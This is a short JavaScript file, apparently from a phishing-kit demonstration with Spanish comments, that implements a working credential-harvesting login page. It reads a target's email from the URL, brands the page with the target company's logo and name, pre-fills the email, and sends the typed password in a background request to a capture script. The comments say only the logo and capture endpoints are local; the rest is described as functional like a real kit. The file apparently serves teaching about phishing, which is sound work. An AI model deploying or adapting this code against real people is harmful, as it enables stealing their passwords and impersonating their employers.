/*
 * dynamic.js — FUNCIONAL de verdad. Ver annotations.md, secciones 2 y 5,
 * y HOW_TO_RUN_LOCALLY.md. La única diferencia con un kit real: el logo
 * se pide a logo_service.php (nuestro propio servidor local, nunca
 * Clearbit/Google) y la contraseña se envía a capture.php (que la
 * escribe en un log local, nunca la manda a ningún sitio externo).
 */

// 1. Lee el email de la víctima desde el parámetro de la URL (?e=...)
const params = new URLSearchParams(window.location.search);
const victimEmail = params.get("e") || "demo@empresa-ejemplo.invalid";
const companyDomain = victimEmail.split("@")[1] || "empresa-ejemplo.invalid";

// 2. Pide el logo EN VIVO — fetch() real, pero a nuestro propio servidor
//    local (logo_service.php), nunca a Clearbit ni Google de verdad:
document.getElementById("company-logo").src = `logo_service.php?domain=${encodeURIComponent(companyDomain)}`;
document.getElementById("company-name").textContent = `Acceso — ${companyDomain} (demo)`;

// 3. Autocompleta el email de la víctima
document.getElementById("email-field").value = victimEmail;

// 4. La fuga: AJAX real en segundo plano, pero a capture.php (log local)
document.getElementById("login-form").addEventListener("submit", async function (e) {
  e.preventDefault();
  const pass = document.getElementById("pass-field").value;

  const resp = await fetch("capture.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: victimEmail, pass }),
  });
  const result = await resp.json();

  const box = document.getElementById("result-box");
  box.textContent = `[DEMO] Guardado en __DEMO_LOG__.txt (solo en tu disco): ${result.saved ? "sí" : "no"}`;
  box.style.display = "block";
});
